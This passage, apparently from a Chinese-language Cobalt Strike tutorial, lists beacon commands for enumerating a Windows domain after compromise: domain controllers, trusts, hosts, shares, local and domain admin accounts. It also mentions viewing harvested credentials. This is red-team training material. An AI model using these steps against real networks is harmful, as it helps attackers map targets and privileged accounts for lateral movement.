点击右上角的工具栏名为凭证信息的图标, 随后下方会显示不同计算机以及对应的用户组账号和密码

![image-20221010110326710](CobaltStrike的使用教程/image-20221010110326710.png)





# 十、简单的域内渗透

## 收集域内信息

### Windows命令

查看网关的ip地址, DNS的ip地址、域名等等：`shell ipconfig /all`

![image-20221011210951148](CobaltStrike的使用教程/image-20221011210951148.png)		

​	

查看当前主机所在的域: `shell net view /domain`

![image-20221010224430630](CobaltStrike的使用教程/image-20221010224430630.png)	

​	

查看当前域的主机列表: `shell net view`

![image-20221011211226280](CobaltStrike的使用教程/image-20221011211226280.png)	



查看指定域的主机列表: `shell net view /domain:[domain]`	

![image-20221011211335485](CobaltStrike的使用教程/image-20221011211335485.png)		



若beacon用户是域控, 则可使用此命令查看当前域的主机列表: `shell net group "domain computers" /domain`

![image-20221010225115101](CobaltStrike的使用教程/image-20221010225115101.png)	



查看指定域的域控: `nltest /dclist:[domain]` 

若上面的命令不能执行就换这条: `shell c:\windows\sysnative\nltest /dclist:[domain]`

![image-20221010225704144](CobaltStrike的使用教程/image-20221010225704144.png)	



查看域内主机的ip地址:`shell nslookup [主机名]` 或`ping -n 1 -4 [主机名]`		

![image-20221010230156941](CobaltStrike的使用教程/image-20221010230156941-16654141188891.png)	

![image-20221010230321289](CobaltStrike的使用教程/image-20221010230321289.png)	



查看当前域的信任关系: `nltest /domain_trusts` 

![image-20221010231042993](CobaltStrike的使用教程/image-20221010231042993.png)	



### CS自带命令

列出当前域的域控: `net dclist`

列出指定域的域控: `net dclist [domain`]

![image-20221010231623756](CobaltStrike的使用教程/image-20221010231623756.png)	



列出当前域控的主机列表: `net view`

列出指定域控的主机: `net view [domain]`	

![image-20221011001134035](CobaltStrike的使用教程/image-20221011001134035.png)	

​	

列出指定主机名的共享列表: `net share \\[主机名]`	

​	![image-20221011000036372](CobaltStrike的使用教程/image-20221011000036372.png)	



### PowerView

先在beacon输入命令导入Powershell脚本: powershell-import, 随后

![image-20221011212431500](CobaltStrike的使用教程/image-20221011212431500.png)	



查询比你低	



## 获取域内用户和管理员信息

### 查询本地管理员账号

判断当前用户是否属于管理员组: `shell whoami/groups`

![image-20221011160047870](CobaltStrike的使用教程/image-20221011160047870.png)



查询本地管理员组的用户: `shell net localgroup administrators`

![image-20221011170850780](CobaltStrike的使用教程/image-20221011170850780.png)	

​	

### 查询域管理员账号

查询所有域的用户列表: `shell net user /domain`

![image-20221011154930259](CobaltStrike的使用教程/image-20221011154930259.png)	

​	

查询域管理员用户: `shell net group "domain admins" /domain` 		

![image-20221011171058284](CobaltStrike的使用教程/image-20221011171058284.png)	



查询企业管理员用户列表: `shell net group "enterprise admins" /domain`

![image-20221011171333738](CobaltStrike的使用教程/image-20221011171333738.png)	

